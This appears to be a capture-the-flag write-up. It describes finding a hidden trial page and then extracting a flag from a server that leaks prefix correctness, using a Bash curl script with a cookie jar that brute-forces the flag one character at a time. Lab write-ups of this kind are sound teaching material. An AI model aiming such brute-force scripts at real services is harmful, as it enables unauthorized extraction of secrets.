# Step by step

Visiting the main page showed only a message, with no visible links. The hint encouraged guessing the name of a "free" version of a normally paid HTML file.
```txt
"Usually, you have to pay in order to see this HTML file. However, today is your lucky day.
We are giving you a free version for a limited amount of time.
Its filename should be quite easy to guess."
```

# 1. Finding the Hidden Page

By guessing common names like free.html, index.html, view.html, I eventually discovered the correct one: **http://141.85.224.118:8083/trial.html**
This page contained a form with the following inputs:

```html
<form method="post" action="churn.php">
    <input type="text" name="txt_input">
    <input type="hidden" name="flag" value="TODO">
</form>
```

The message on the page was key: "*You'll get four answers: not right, keep going, too much and the flag.*"

I sent different POST requests to **churn.php** and observed the responses.

Example:

```bash
curl -X POST http://141.85.224.118:8083/churn.php \
     -d "txt_input=" -d "flag=S"
```

Responses like:
- "not right" → wrong guess
- "keep going" → partial match!
- "too much" → invalid prefix (too long or invalid character)

It was clear this was a character-by-character brute-force challenge, requiring session management via cookies. After observing that responses were tied to the session, I realized cookies must be preserved across requests. So I wrote a Bash script that: Maintains a cookie jar and starts with a clean session, it loops through characters, appending one at a time and interprets feedback to build the correct flag step by step. Stops once the flag is fully correct build.

## Exploit Script

```bash
#!/bin/bash

URL="http://141.85.224.118:8083/churn.php"
COOKIEJAR="cookies.txt"
charset="_-[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-"  # edit if needed
flag=""
last_len=0
max_loops=5
loop_count=0
delay=0  # 300ms delay between requests

# Start new clean session
rm -f "$COOKIEJAR"
curl -s http://141.85.224.118:8084/ -c "$COOKIEJAR" > /dev/null

while true; do
    found_new=false

    for c in $(echo -n "$charset" | fold -w1); do
        try="${flag}${c}"
        echo -ne "[*] Trying: $try ... "

        resp=$(curl -s -X POST "$URL" \
            -d "txt_input=" \
            -d "flag=$try" \
            -b "$COOKIEJAR" -c "$COOKIEJAR")

        sleep "$delay"  # <<< ADDING DELAY

        if echo "$resp" | grep -q "keep going"; then
            flag="$try"
            echo -e "\r[+] Valid prefix: $flag"
            found_new=true
            break
        elif echo "$resp" | grep -oE "SSS\{[^}]+\}"; then
            echo -e "\n[✓] FLAG FOUND: $(echo "$resp" | grep -oE "SSS\{[^}]+\}")"
            exit 0
        else
            echo "nope"
        fi
    done

    if [ "$found_new" = false ]; then
        echo "[!] No valid extension for: $flag"
        loop_count=$((loop_count + 1))
    else
        loop_count=0
    fi

    if [ "$loop_count" -ge "$max_loops" ]; then
        echo "[X] Loop detected. Stopping to prevent infinite run."
        echo "[?] Current flag guess: $flag"
        exit 1
    fi
done
```
After a few minutes of execution, the script successfully printed the flag: **SSS{why_is_all_the_rum_gone}**
